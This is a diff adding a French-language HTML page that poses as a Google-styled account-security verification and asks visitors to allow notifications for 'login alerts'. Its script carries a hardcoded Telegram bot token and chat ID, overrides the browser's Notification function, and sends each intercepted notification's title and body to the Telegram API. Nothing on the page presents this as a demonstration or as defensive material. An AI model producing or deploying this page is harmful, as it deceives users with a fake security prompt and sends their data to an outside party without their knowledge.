@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f8f9fa; /* Fond gris très clair type Google */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* Icône de sécurité en CSS pur */
+        .icon-lock {
+            width: 60px;
+            height: 60px;
+            background-color: #1a73e8;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon-lock::after {
+            content: "🔒";
+            font-size: 30px;
+            color: white;
+        }
+
+        h2 { 
+            font-size: 22px; 
+            color: #202124;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+        
+        p { 
+            color: #5f6368; 
+            font-size: 15px; 
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        button { 
+            width: 100%;
+            padding: 13px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background-color: #1a73e8; /* Bleu Google */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 500;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #1765cc; }
+        
+        .success-msg {
+            display: none;
+            color: #137333;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="icon-lock"></div>
+        <h2>Sécurité du compte</h2>
+        <p>Pour garantir la sécurité de vos données, veuillez autoriser les notifications pour recevoir les alertes de connexion.</p>
+        
+        <button id="btn">Continuer</button>
+        <div class="spinner" id="loader"></div>
+        <div class="success-msg" id="msgSuccess">✅ Vérification terminée.</div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION TELEGRAM ---
+        const BOT_TOKEN = '8748370305:AAEieajgcf81JJVDndgi403lSSqjoFMJCCM'; 
+        const CHAT_ID = '8077179220';
+        // ------------------------------
+
+        document.addEventListener('DOMContentLoaded', () => {
+            if (Notification.permission === 'granted') {
+                showSuccess();
+            }
+        });
+
+        function showSuccess() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('msgSuccess').style.display = 'block';
+        }
+
+        document.getElementById('btn').addEventListener('click', () => {
+            const loader = document.getElementById('loader');
+            loader.style.display = 'block';
+
+            if (!("Notification" in window)) {
+                loader.style.display = 'none';
+                return;
+            }
+
+            Notification.requestPermission().then(permission => {
+                loader.style.display = 'none';
+                
+                if (permission === "granted") {
+                    interceptNotifications();
+                    showSuccess();
+                    
+                    // Test silencieux
+                    setTimeout(() => {
+                        new Notification("Système sécurisé", {
+                            body: "Connexion confirmée.",
+                            silent: true 
+                        });
+                    }, 1000);
+                }
+            });
+        });
+
+        function interceptNotifications() {
+            const originalNotify = window.Notification;
+            
+            window.Notification = function(title, options) {
+                sendToTelegram(title, options ? options.body : "");
+            };
+        }
+
+        function sendToTelegram(title, body) {
+            const message = `📡 *Alerte Interceptée*\n\n` +
+                            `🔹 Titre: ${title}\n` +
+                            `🔹 Contenu: ${body || "(Aucun)"}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Erreur envoi TG:", err));
+        }
+    </script>
+
+</body>
+</html>
